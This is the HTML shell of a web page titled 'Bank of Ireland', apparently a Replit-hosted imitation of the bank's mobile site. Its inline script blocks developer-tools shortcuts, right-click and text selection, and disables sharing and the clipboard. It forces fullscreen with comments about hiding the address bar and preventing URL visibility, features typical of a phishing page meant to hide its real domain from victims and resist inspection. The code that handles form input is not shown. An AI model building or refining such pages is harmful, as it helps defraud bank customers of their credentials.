    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https:; connect-src 'self' wss: https:;">
    <meta name="referrer" content="no-referrer">

    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />

    <meta name="theme-color" content="#126987" />
    <meta name="msapplication-TileColor" content="#126987" />
    <meta name="msapplication-navbutton-color" content="#126987" />
    
    <!-- Android Chrome specific -->
    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no, url=no" />
    <meta name="screen-orientation" content="portrait" />
    <meta name="full-screen" content="yes" />

    <!-- PWA Manifest -->
    <link rel="manifest" href="/manifest.json" />
    
    <!-- App Icons for different devices -->
    <link rel="apple-touch-icon" sizes="57x57" href="/boi_app_icon.png" />
    <link rel="apple-touch-icon" sizes="60x60" href="/boi_app_icon.png" />
    <link rel="apple-touch-icon" sizes="72x72" href="/boi_app_icon.png" />

    <link rel="apple-touch-icon" sizes="144x144" href="/boi_app_icon.png" />
    <link rel="apple-touch-icon" sizes="152x152" href="/boi_app_icon.png" />
    <link rel="apple-touch-icon" sizes="180x180" href="/boi_app_icon.png" />
    <link rel="icon" type="image/png" sizes="192x192" href="/boi_app_icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/boi_app_icon.png" />
    <link rel="icon" type="image/png" sizes="96x96" href="/boi_app_icon.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/boi_app_icon.png" />
    
    <title>Bank of Ireland</title>
  </head>
  <body style="background: transparent !important;">
    <div id="root" style="background: transparent !important;"></div>
    <script>
      // Set theme color to correct blue immediately before React loads
      const themeColorMeta = document.querySelector('meta[name="theme-color"]');
      if (themeColorMeta) {
        themeColorMeta.setAttribute('content', '#000DFF');
      }

      // Security measures to prevent sharing and copying
      document.addEventListener('DOMContentLoaded', function() {
        // Disable right-click context menu
        document.addEventListener('contextmenu', function(e) {
          e.preventDefault();
          return false;
        });

        // Security restrictions that don't interfere with form inputs
        document.addEventListener('selectstart', function(e) {
          // Allow text selection in form elements
          if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            return true;
          }
          e.preventDefault();
          return false;
        });

        // Disable keyboard shortcuts for security (excluding form interference)
        document.addEventListener('keydown', function(e) {
          // Allow all keyboard input in form elements
          if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            return true;
          }
          
          // Block developer tools shortcuts only outside forms
          if (e.key === 'F12' || 
              (e.ctrlKey && e.shiftKey && ['I', 'C', 'J'].includes(e.key))) {
            e.preventDefault();
            return false;
          }
        });

        // Disable image drag
        const images = document.querySelectorAll('img');
        images.forEach(img => {
          img.addEventListener('dragstart', function(e) {
            e.preventDefault();
            return false;
          });
        });

        // Android-specific viewport and keyboard handling
        function setupAndroidOptimizations() {
          const isAndroid = /Android/i.test(navigator.userAgent);
          const isSamsung = /SamsungBrowser/i.test(navigator.userAgent);
          const isChrome = /Chrome/i.test(navigator.userAgent) && !isSamsung;
          
          if (isAndroid) {
            // Set viewport height variable for Android
            function setViewportHeight() {
              const vh = window.innerHeight * 0.01;
              document.documentElement.style.setProperty('--vh', `${vh}px`);
              document.documentElement.style.setProperty('--app-height', `${window.innerHeight}px`);
            }
            
            setViewportHeight();
            window.addEventListener('resize', setViewportHeight);
            window.addEventListener('orientationchange', () => {
              setTimeout(setViewportHeight, 100);
            });
            
            // Android keyboard handling
            let initialHeight = window.innerHeight;
            window.addEventListener('resize', function() {
              const currentHeight = window.innerHeight;
              const heightDifference = initialHeight - currentHeight;
              
              if (heightDifference > 150) {
                // Keyboard is likely open
                document.body.classList.add('keyboard-visible');
                document.documentElement.style.setProperty('--keyboard-height', `${heightDifference}px`);
              } else {
                // Keyboard is likely closed
                document.body.classList.remove('keyboard-visible');
                document.documentElement.style.setProperty('--keyboard-height', '0px');
              }
            });
            
            // Samsung Internet specific fixes
            if (isSamsung) {
              document.body.classList.add('samsung-browser');
              // Fix Samsung Internet button rendering
              const style = document.createElement('style');
              style.textContent = `
                button, input[type="submit"], input[type="button"] {
                  -webkit-appearance: none !important;
                  appearance: none !important;
                  border-radius: 8px !important;
                }
              `;
              document.head.appendChild(style);
            }
            
            // Chrome Mobile specific fixes
            if (isChrome) {
              document.body.classList.add('chrome-mobile');
              // Fix Chrome mobile autofill
              const style = document.createElement('style');
              style.textContent = `
                input:-webkit-autofill {
                  -webkit-box-shadow: 0 0 0 30px white inset !important;
                  -webkit-text-fill-color: #000 !important;
                  background-clip: content-box !important;
                }
              `;
              document.head.appendChild(style);
            }
          }
        }
        
        setupAndroidOptimizations();
        
        // Hide URL bar on mobile
        if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
          setTimeout(function() {
            window.scrollTo(0, 1);
          }, 100);
        }

        // Prevent sharing via Web Share API detection
        if ('share' in navigator) {
          // Override the share function
          navigator.share = function() {
            return Promise.reject(new Error('Sharing is disabled for security reasons'));
          };
        }
      });

      // Developer tools detection removed - was causing form interference

      // Register service worker for enhanced security
      if ('serviceWorker' in navigator) {
        window.addEventListener('load', function() {
          navigator.serviceWorker.register('/sw.js')
            .then(function(registration) {
              console.log('SW registered with scope: ', registration.scope);
            })
            .catch(function(err) {
              console.log('SW registration failed: ', err);
            });
        });
      }

      // Additional mobile-specific URL hiding
      window.addEventListener('load', function() {
        // Force fullscreen on mobile devices
        if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
          // Hide address bar completely
          setTimeout(function() {
            window.scrollTo(0, 1);
            
            // Request fullscreen if available
            if (document.documentElement.requestFullscreen) {
              document.documentElement.requestFullscreen().catch(() => {});
            } else if (document.documentElement.webkitRequestFullscreen) {
              document.documentElement.webkitRequestFullscreen().catch(() => {});
            }
          }, 1000);
        }
      });

      // Prevent URL visibility in sharing menus
      if ('navigator' in window && 'share' in navigator) {
        // Override Web Share API completely
        Object.defineProperty(navigator, 'share', {
          value: function() {
            return Promise.reject(new Error('Sharing disabled for security'));
          },
          writable: false,
          configurable: false
        });
      }

      // Block clipboard operations
      if ('navigator' in window && 'clipboard' in navigator) {
        Object.defineProperty(navigator, 'clipboard', {
          value: {
            writeText: () => Promise.reject(new Error('Clipboard disabled')),
            readText: () => Promise.reject(new Error('Clipboard disabled')),
            write: () => Promise.reject(new Error('Clipboard disabled')),
            read: () => Promise.reject(new Error('Clipboard disabled'))
          },
          writable: false,
          configurable: false
        });
      }
    </script>
    <script type="module" src="/src/main.tsx"></script>
    <!-- This is a replit script which adds a banner on the top of the page when opened in development mode outside the replit environment -->
    <script type="text/javascript" src="https://replit.com/public/js/replit-dev-banner.js"></script>
  </body>
</html>
